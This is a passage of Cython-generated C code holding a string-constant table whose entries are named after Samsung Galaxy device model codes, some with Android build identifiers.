    {&__pyx_kp_s_GT_I5508, __pyx_k_GT_I5508, sizeof(__pyx_k_GT_I5508), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I5801, __pyx_k_GT_I5801, sizeof(__pyx_k_GT_I5801), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I6410, __pyx_k_GT_I6410, sizeof(__pyx_k_GT_I6410), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8150, __pyx_k_GT_I8150, sizeof(__pyx_k_GT_I8150), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8160OKLTPA, __pyx_k_GT_I8160OKLTPA, sizeof(__pyx_k_GT_I8160OKLTPA), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8160ZWLTTT, __pyx_k_GT_I8160ZWLTTT, sizeof(__pyx_k_GT_I8160ZWLTTT), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8258, __pyx_k_GT_I8258, sizeof(__pyx_k_GT_I8258), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8262D, __pyx_k_GT_I8262D, sizeof(__pyx_k_GT_I8262D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8268, __pyx_k_GT_I8268, sizeof(__pyx_k_GT_I8268), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8505, __pyx_k_GT_I8505, sizeof(__pyx_k_GT_I8505), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8530BAABTU, __pyx_k_GT_I8530BAABTU, sizeof(__pyx_k_GT_I8530BAABTU), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8530BALCHO, __pyx_k_GT_I8530BALCHO, sizeof(__pyx_k_GT_I8530BALCHO), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8530BALTTT, __pyx_k_GT_I8530BALTTT, sizeof(__pyx_k_GT_I8530BALTTT), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8550E, __pyx_k_GT_I8550E, sizeof(__pyx_k_GT_I8550E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I8750, __pyx_k_GT_I8750, sizeof(__pyx_k_GT_I8750), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I900, __pyx_k_GT_I900, sizeof(__pyx_k_GT_I900), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9008L, __pyx_k_GT_I9008L, sizeof(__pyx_k_GT_I9008L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9080E, __pyx_k_GT_I9080E, sizeof(__pyx_k_GT_I9080E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9082C, __pyx_k_GT_I9082C, sizeof(__pyx_k_GT_I9082C), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9082EWAINU, __pyx_k_GT_I9082EWAINU, sizeof(__pyx_k_GT_I9082EWAINU), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9082i, __pyx_k_GT_I9082i, sizeof(__pyx_k_GT_I9082i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9100G, __pyx_k_GT_I9100G, sizeof(__pyx_k_GT_I9100G), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9100LKLCHT, __pyx_k_GT_I9100LKLCHT, sizeof(__pyx_k_GT_I9100LKLCHT), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9100M, __pyx_k_GT_I9100M, sizeof(__pyx_k_GT_I9100M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9100P, __pyx_k_GT_I9100P, sizeof(__pyx_k_GT_I9100P), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9100T, __pyx_k_GT_I9100T, sizeof(__pyx_k_GT_I9100T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9105UANDBT, __pyx_k_GT_I9105UANDBT, sizeof(__pyx_k_GT_I9105UANDBT), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9128E, __pyx_k_GT_I9128E, sizeof(__pyx_k_GT_I9128E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9128I, __pyx_k_GT_I9128I, sizeof(__pyx_k_GT_I9128I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9128V, __pyx_k_GT_I9128V, sizeof(__pyx_k_GT_I9128V), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9158P, __pyx_k_GT_I9158P, sizeof(__pyx_k_GT_I9158P), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9158V, __pyx_k_GT_I9158V, sizeof(__pyx_k_GT_I9158V), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9168I, __pyx_k_GT_I9168I, sizeof(__pyx_k_GT_I9168I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9190_KOT49H, __pyx_k_GT_I9190_KOT49H, sizeof(__pyx_k_GT_I9190_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9192I, __pyx_k_GT_I9192I, sizeof(__pyx_k_GT_I9192I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9192_KOT49H, __pyx_k_GT_I9192_KOT49H, sizeof(__pyx_k_GT_I9192_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9195H, __pyx_k_GT_I9195H, sizeof(__pyx_k_GT_I9195H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9195L, __pyx_k_GT_I9195L, sizeof(__pyx_k_GT_I9195L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9250, __pyx_k_GT_I9250, sizeof(__pyx_k_GT_I9250), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9300I_KTU84P, __pyx_k_GT_I9300I_KTU84P, sizeof(__pyx_k_GT_I9300I_KTU84P), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9300_IMM76D, __pyx_k_GT_I9300_IMM76D, sizeof(__pyx_k_GT_I9300_IMM76D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9300_JSS15J, __pyx_k_GT_I9300_JSS15J, sizeof(__pyx_k_GT_I9300_JSS15J), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9301I_KOT4, __pyx_k_GT_I9301I_KOT4, sizeof(__pyx_k_GT_I9301I_KOT4), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9301I_KOT49H, __pyx_k_GT_I9301I_KOT49H, sizeof(__pyx_k_GT_I9301I_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9303I, __pyx_k_GT_I9303I, sizeof(__pyx_k_GT_I9303I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9305N, __pyx_k_GT_I9305N, sizeof(__pyx_k_GT_I9305N), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9308I, __pyx_k_GT_I9308I, sizeof(__pyx_k_GT_I9308I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9500_JDQ39, __pyx_k_GT_I9500_JDQ39, sizeof(__pyx_k_GT_I9500_JDQ39), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9500_LRX22C, __pyx_k_GT_I9500_LRX22C, sizeof(__pyx_k_GT_I9500_LRX22C), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9505G, __pyx_k_GT_I9505G, sizeof(__pyx_k_GT_I9505G), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9505X, __pyx_k_GT_I9505X, sizeof(__pyx_k_GT_I9505X), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9507V, __pyx_k_GT_I9507V, sizeof(__pyx_k_GT_I9507V), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9600, __pyx_k_GT_I9600, sizeof(__pyx_k_GT_I9600), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_M5650, __pyx_k_GT_M5650, sizeof(__pyx_k_GT_M5650), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N5000S, __pyx_k_GT_N5000S, sizeof(__pyx_k_GT_N5000S), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N5100, __pyx_k_GT_N5100, sizeof(__pyx_k_GT_N5100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N5100_JZO54K, __pyx_k_GT_N5100_JZO54K, sizeof(__pyx_k_GT_N5100_JZO54K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N5105, __pyx_k_GT_N5105, sizeof(__pyx_k_GT_N5105), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N5110, __pyx_k_GT_N5110, sizeof(__pyx_k_GT_N5110), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N5120, __pyx_k_GT_N5120, sizeof(__pyx_k_GT_N5120), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7000B, __pyx_k_GT_N7000B, sizeof(__pyx_k_GT_N7000B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7005, __pyx_k_GT_N7005, sizeof(__pyx_k_GT_N7005), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7100T, __pyx_k_GT_N7100T, sizeof(__pyx_k_GT_N7100T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7100_KOT49H, __pyx_k_GT_N7100_KOT49H, sizeof(__pyx_k_GT_N7100_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7102, __pyx_k_GT_N7102, sizeof(__pyx_k_GT_N7102), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7105, __pyx_k_GT_N7105, sizeof(__pyx_k_GT_N7105), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7105T, __pyx_k_GT_N7105T, sizeof(__pyx_k_GT_N7105T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7108, __pyx_k_GT_N7108, sizeof(__pyx_k_GT_N7108), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7108D, __pyx_k_GT_N7108D, sizeof(__pyx_k_GT_N7108D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N8000, __pyx_k_GT_N8000, sizeof(__pyx_k_GT_N8000), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N8000_JZO54K, __pyx_k_GT_N8000_JZO54K, sizeof(__pyx_k_GT_N8000_JZO54K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N8000_KOT49H, __pyx_k_GT_N8000_KOT49H, sizeof(__pyx_k_GT_N8000_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N8005, __pyx_k_GT_N8005, sizeof(__pyx_k_GT_N8005), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N8010, __pyx_k_GT_N8010, sizeof(__pyx_k_GT_N8010), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N8020, __pyx_k_GT_N8020, sizeof(__pyx_k_GT_N8020), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N9000, __pyx_k_GT_N9000, sizeof(__pyx_k_GT_N9000), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N9505, __pyx_k_GT_N9505, sizeof(__pyx_k_GT_N9505), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P1000CWAXSA, __pyx_k_GT_P1000CWAXSA, sizeof(__pyx_k_GT_P1000CWAXSA), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P1000M, __pyx_k_GT_P1000M, sizeof(__pyx_k_GT_P1000M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P1000T, __pyx_k_GT_P1000T, sizeof(__pyx_k_GT_P1000T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P1010, __pyx_k_GT_P1010, sizeof(__pyx_k_GT_P1010), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P3100B, __pyx_k_GT_P3100B, sizeof(__pyx_k_GT_P3100B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P3105, __pyx_k_GT_P3105, sizeof(__pyx_k_GT_P3105), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P3108, __pyx_k_GT_P3108, sizeof(__pyx_k_GT_P3108), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P3110, __pyx_k_GT_P3110, sizeof(__pyx_k_GT_P3110), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P3110_JZO54K, __pyx_k_GT_P3110_JZO54K, sizeof(__pyx_k_GT_P3110_JZO54K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5100, __pyx_k_GT_P5100, sizeof(__pyx_k_GT_P5100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5100_IML74K, __pyx_k_GT_P5100_IML74K, sizeof(__pyx_k_GT_P5100_IML74K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5100_JDQ, __pyx_k_GT_P5100_JDQ, sizeof(__pyx_k_GT_P5100_JDQ), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5100_JDQ39, __pyx_k_GT_P5100_JDQ39, sizeof(__pyx_k_GT_P5100_JDQ39), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5100_JZO54K, __pyx_k_GT_P5100_JZO54K, sizeof(__pyx_k_GT_P5100_JZO54K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5110_JDQ39, __pyx_k_GT_P5110_JDQ39, sizeof(__pyx_k_GT_P5110_JDQ39), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5200, __pyx_k_GT_P5200, sizeof(__pyx_k_GT_P5200), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5200_KOT49H, __pyx_k_GT_P5200_KOT49H, sizeof(__pyx_k_GT_P5200_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5210XD1, __pyx_k_GT_P5210XD1, sizeof(__pyx_k_GT_P5210XD1), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5210_KOT49H, __pyx_k_GT_P5210_KOT49H, sizeof(__pyx_k_GT_P5210_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5220, __pyx_k_GT_P5220, sizeof(__pyx_k_GT_P5220), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5220_JDQ39, __pyx_k_GT_P5220_JDQ39, sizeof(__pyx_k_GT_P5220_JDQ39), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P6200, __pyx_k_GT_P6200, sizeof(__pyx_k_GT_P6200), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P6200L, __pyx_k_GT_P6200L, sizeof(__pyx_k_GT_P6200L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P6201, __pyx_k_GT_P6201, sizeof(__pyx_k_GT_P6201), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P6210, __pyx_k_GT_P6210, sizeof(__pyx_k_GT_P6210), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P6211, __pyx_k_GT_P6211, sizeof(__pyx_k_GT_P6211), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P6800, __pyx_k_GT_P6800, sizeof(__pyx_k_GT_P6800), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7100, __pyx_k_GT_P7100, sizeof(__pyx_k_GT_P7100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7300, __pyx_k_GT_P7300, sizeof(__pyx_k_GT_P7300), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7300B, __pyx_k_GT_P7300B, sizeof(__pyx_k_GT_P7300B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7310, __pyx_k_GT_P7310, sizeof(__pyx_k_GT_P7310), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7320, __pyx_k_GT_P7320, sizeof(__pyx_k_GT_P7320), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7500D, __pyx_k_GT_P7500D, sizeof(__pyx_k_GT_P7500D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7500M, __pyx_k_GT_P7500M, sizeof(__pyx_k_GT_P7500M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7500R, __pyx_k_GT_P7500R, sizeof(__pyx_k_GT_P7500R), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7500V, __pyx_k_GT_P7500V, sizeof(__pyx_k_GT_P7500V), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7501, __pyx_k_GT_P7501, sizeof(__pyx_k_GT_P7501), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P7511, __pyx_k_GT_P7511, sizeof(__pyx_k_GT_P7511), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3330, __pyx_k_GT_S3330, sizeof(__pyx_k_GT_S3330), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3332, __pyx_k_GT_S3332, sizeof(__pyx_k_GT_S3332), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3333, __pyx_k_GT_S3333, sizeof(__pyx_k_GT_S3333), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3370, __pyx_k_GT_S3370, sizeof(__pyx_k_GT_S3370), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3518, __pyx_k_GT_S3518, sizeof(__pyx_k_GT_S3518), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3570, __pyx_k_GT_S3570, sizeof(__pyx_k_GT_S3570), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3600i, __pyx_k_GT_S3600i, sizeof(__pyx_k_GT_S3600i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3650, __pyx_k_GT_S3650, sizeof(__pyx_k_GT_S3650), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3653W, __pyx_k_GT_S3653W, sizeof(__pyx_k_GT_S3653W), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3770K, __pyx_k_GT_S3770K, sizeof(__pyx_k_GT_S3770K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3770M, __pyx_k_GT_S3770M, sizeof(__pyx_k_GT_S3770M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3800W, __pyx_k_GT_S3800W, sizeof(__pyx_k_GT_S3800W), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3802, __pyx_k_GT_S3802, sizeof(__pyx_k_GT_S3802), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S3850, __pyx_k_GT_S3850, sizeof(__pyx_k_GT_S3850), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5220, __pyx_k_GT_S5220, sizeof(__pyx_k_GT_S5220), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5220R, __pyx_k_GT_S5220R, sizeof(__pyx_k_GT_S5220R), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5222, __pyx_k_GT_S5222, sizeof(__pyx_k_GT_S5222), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5230, __pyx_k_GT_S5230, sizeof(__pyx_k_GT_S5230), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5230W, __pyx_k_GT_S5230W, sizeof(__pyx_k_GT_S5230W), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5233T, __pyx_k_GT_S5233T, sizeof(__pyx_k_GT_S5233T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5250, __pyx_k_GT_S5250, sizeof(__pyx_k_GT_S5250), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5253, __pyx_k_GT_S5253, sizeof(__pyx_k_GT_S5253), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5280, __pyx_k_GT_S5280, sizeof(__pyx_k_GT_S5280), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5282, __pyx_k_GT_S5282, sizeof(__pyx_k_GT_S5282), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5283B, __pyx_k_GT_S5283B, sizeof(__pyx_k_GT_S5283B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5292, __pyx_k_GT_S5292, sizeof(__pyx_k_GT_S5292), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5300, __pyx_k_GT_S5300, sizeof(__pyx_k_GT_S5300), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5300L, __pyx_k_GT_S5300L, sizeof(__pyx_k_GT_S5300L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5301, __pyx_k_GT_S5301, sizeof(__pyx_k_GT_S5301), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5301B, __pyx_k_GT_S5301B, sizeof(__pyx_k_GT_S5301B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5301L, __pyx_k_GT_S5301L, sizeof(__pyx_k_GT_S5301L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5302, __pyx_k_GT_S5302, sizeof(__pyx_k_GT_S5302), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5302B, __pyx_k_GT_S5302B, sizeof(__pyx_k_GT_S5302B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5303, __pyx_k_GT_S5303, sizeof(__pyx_k_GT_S5303), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5303B, __pyx_k_GT_S5303B, sizeof(__pyx_k_GT_S5303B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310, __pyx_k_GT_S5310, sizeof(__pyx_k_GT_S5310), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310B, __pyx_k_GT_S5310B, sizeof(__pyx_k_GT_S5310B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310C, __pyx_k_GT_S5310C, sizeof(__pyx_k_GT_S5310C), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310E, __pyx_k_GT_S5310E, sizeof(__pyx_k_GT_S5310E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310G, __pyx_k_GT_S5310G, sizeof(__pyx_k_GT_S5310G), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310I, __pyx_k_GT_S5310I, sizeof(__pyx_k_GT_S5310I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310L, __pyx_k_GT_S5310L, sizeof(__pyx_k_GT_S5310L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310M, __pyx_k_GT_S5310M, sizeof(__pyx_k_GT_S5310M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5310N, __pyx_k_GT_S5310N, sizeof(__pyx_k_GT_S5310N), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5312, __pyx_k_GT_S5312, sizeof(__pyx_k_GT_S5312), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5312B, __pyx_k_GT_S5312B, sizeof(__pyx_k_GT_S5312B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5312C, __pyx_k_GT_S5312C, sizeof(__pyx_k_GT_S5312C), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5312L, __pyx_k_GT_S5312L, sizeof(__pyx_k_GT_S5312L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5330, __pyx_k_GT_S5330, sizeof(__pyx_k_GT_S5330), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5360, __pyx_k_GT_S5360, sizeof(__pyx_k_GT_S5360), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5360B, __pyx_k_GT_S5360B, sizeof(__pyx_k_GT_S5360B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5360L, __pyx_k_GT_S5360L, sizeof(__pyx_k_GT_S5360L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5360T, __pyx_k_GT_S5360T, sizeof(__pyx_k_GT_S5360T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5363, __pyx_k_GT_S5363, sizeof(__pyx_k_GT_S5363), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5367, __pyx_k_GT_S5367, sizeof(__pyx_k_GT_S5367), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5369, __pyx_k_GT_S5369, sizeof(__pyx_k_GT_S5369), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5380, __pyx_k_GT_S5380, sizeof(__pyx_k_GT_S5380), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5380D, __pyx_k_GT_S5380D, sizeof(__pyx_k_GT_S5380D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5500, __pyx_k_GT_S5500, sizeof(__pyx_k_GT_S5500), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5560, __pyx_k_GT_S5560, sizeof(__pyx_k_GT_S5560), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5560i, __pyx_k_GT_S5560i, sizeof(__pyx_k_GT_S5560i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5570B, __pyx_k_GT_S5570B, sizeof(__pyx_k_GT_S5570B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5570I, __pyx_k_GT_S5570I, sizeof(__pyx_k_GT_S5570I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5570L, __pyx_k_GT_S5570L, sizeof(__pyx_k_GT_S5570L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5578, __pyx_k_GT_S5578, sizeof(__pyx_k_GT_S5578), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5600, __pyx_k_GT_S5600, sizeof(__pyx_k_GT_S5600), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5603, __pyx_k_GT_S5603, sizeof(__pyx_k_GT_S5603), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5610, __pyx_k_GT_S5610, sizeof(__pyx_k_GT_S5610), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5610K, __pyx_k_GT_S5610K, sizeof(__pyx_k_GT_S5610K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5611, __pyx_k_GT_S5611, sizeof(__pyx_k_GT_S5611), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5620, __pyx_k_GT_S5620, sizeof(__pyx_k_GT_S5620), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5670, __pyx_k_GT_S5670, sizeof(__pyx_k_GT_S5670), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5670B, __pyx_k_GT_S5670B, sizeof(__pyx_k_GT_S5670B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5670HKBZTA, __pyx_k_GT_S5670HKBZTA, sizeof(__pyx_k_GT_S5670HKBZTA), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5690, __pyx_k_GT_S5690, sizeof(__pyx_k_GT_S5690), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5690R, __pyx_k_GT_S5690R, sizeof(__pyx_k_GT_S5690R), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830, __pyx_k_GT_S5830, sizeof(__pyx_k_GT_S5830), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830D, __pyx_k_GT_S5830D, sizeof(__pyx_k_GT_S5830D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830G, __pyx_k_GT_S5830G, sizeof(__pyx_k_GT_S5830G), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830L, __pyx_k_GT_S5830L, sizeof(__pyx_k_GT_S5830L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830M, __pyx_k_GT_S5830M, sizeof(__pyx_k_GT_S5830M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830T, __pyx_k_GT_S5830T, sizeof(__pyx_k_GT_S5830T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830V, __pyx_k_GT_S5830V, sizeof(__pyx_k_GT_S5830V), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5830i, __pyx_k_GT_S5830i, sizeof(__pyx_k_GT_S5830i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5831i, __pyx_k_GT_S5831i, sizeof(__pyx_k_GT_S5831i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5838, __pyx_k_GT_S5838, sizeof(__pyx_k_GT_S5838), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S5839i, __pyx_k_GT_S5839i, sizeof(__pyx_k_GT_S5839i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6010, __pyx_k_GT_S6010, sizeof(__pyx_k_GT_S6010), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6010BBABTU, __pyx_k_GT_S6010BBABTU, sizeof(__pyx_k_GT_S6010BBABTU), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6012, __pyx_k_GT_S6012, sizeof(__pyx_k_GT_S6012), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6012B, __pyx_k_GT_S6012B, sizeof(__pyx_k_GT_S6012B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6102, __pyx_k_GT_S6102, sizeof(__pyx_k_GT_S6102), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6102B, __pyx_k_GT_S6102B, sizeof(__pyx_k_GT_S6102B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6293T, __pyx_k_GT_S6293T, sizeof(__pyx_k_GT_S6293T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6310B, __pyx_k_GT_S6310B, sizeof(__pyx_k_GT_S6310B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6310ZWAMID, __pyx_k_GT_S6310ZWAMID, sizeof(__pyx_k_GT_S6310ZWAMID), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6312, __pyx_k_GT_S6312, sizeof(__pyx_k_GT_S6312), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6313T, __pyx_k_GT_S6313T, sizeof(__pyx_k_GT_S6313T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6352, __pyx_k_GT_S6352, sizeof(__pyx_k_GT_S6352), 0, 0, 1, 0},
